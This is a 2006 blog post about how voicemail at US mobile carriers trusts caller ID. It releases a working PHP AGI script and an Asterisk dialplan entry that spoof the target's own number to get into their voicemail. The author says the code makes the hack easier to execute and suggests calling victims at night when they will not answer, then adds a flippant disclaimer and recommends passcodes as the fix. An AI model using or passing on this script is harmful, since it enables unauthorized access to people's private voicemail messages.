--- 
wordpress_id: 1352
layout: post
title: Hacking mobile voicemail with Asterisk and caller ID spoofing
date: 2006-09-24 23:36:16 -05:00
tags: technology, technology
wordpress_url: http://www.nata2.org/2006/09/24/hacking-voicemail-with-asterisk-and-caller-id-spoofing/
---
So there has always had a problem with US mobile providers having their voicemail be susceptible to being compromised by calling with a spoofed caller id. Apparently most providers caller id apps just checks the referring callerid - and doesn't force the voicemail user to pick a passcode; so it allows someone to trick the voicemail app into believing they are calling from a trusted number.

This has been covered all <a href="http://www.toast442.org/C662738431/E680925937/index.html">over the</a> <a href="http://www.i-hacked.com/content/view/124/47">Internet</a> and was in the <a href="http://www.macdevcenter.com/pub/a/mac/2005/01/01/paris.html">spotlight</a> awhile back when it was alleged that this was how <a href="http://blog.tmcnet.com/blog/tom-keating/mobile-phones/paris-hilton-hacks-voicemail-using-asterisk.asp">Paris Hilton's mobile phone was hacked</a>. It is a pretty big problem and is probably really easy to fix.

So, just to make things funnier - I decided that I would release a snippit of code that would make it easier to execute this hack.
<blockquote>#!/asterisk/php/bin/php -q
&lt;?

set_time_limit(30); //make sure the php script doesn't time out
require('phpagi.php'); // include the phpagi class
error_reporting(E_ALL);  // limit the errors

$agi = new AGI(); // instantiate the AGI class
$agi-&gt;answer(); // answer the phone
sleep(2); // wait a sec or two

$agi-&gt;stream_file('enter_spoof'); // speak a wav file that says "enter the number"
$result = $agi-&gt;get_data('beep', 3000, 10); // beep and grab the 10 numbers
$agi-&gt;verbose("Number to call:".$result['result']); // throw info so you know whats up
$agi-&gt;set_callerid($result['result']); // set caller id to the number you are calling
$agi-&gt;exec("Dial IAX2/iax-provider/1".$result['result']); // call the number

?&gt;</blockquote>
You can add this to your /var/lib/asterisk/agi-bin dir and then specify the extension you want to use to dial and execute the php/agi script
<blockquote>exten =&gt; 666,1,Answer
exten =&gt; 666,2,AGI(tmobilevoicemail_spoof.php)
exten =&gt; 666,3,Hangup</blockquote>
Then when you dial 666  it executes the script. It will ask you what number to dial then dial it after setting the caller id to the same number. It will dial the number and then ring the phone. If the phone is on and the target number is answered - it won't work; however if the person doesn't answer you will be placed in the targets voicemail as a trusted user. So, I would suggest calling people in the middle of the night or when you know they will not answer. Wait.. I actually wouldn't suggest calling anyone but yourself.

It seems to me that the only viable solution that will be compatible with all phones, people and providers is to force the users to choose passcode to your voicemail.

This is - of course - a proof of concept. You should not actually hack peoples voicemails. That is not very nice.  We are into being nice.

Also, check out my <a href="http://www.nata2.org/2006/02/14/caller-id-spoofing-with-php-and-asterisk/">previous entry on caller id spoofing</a>.
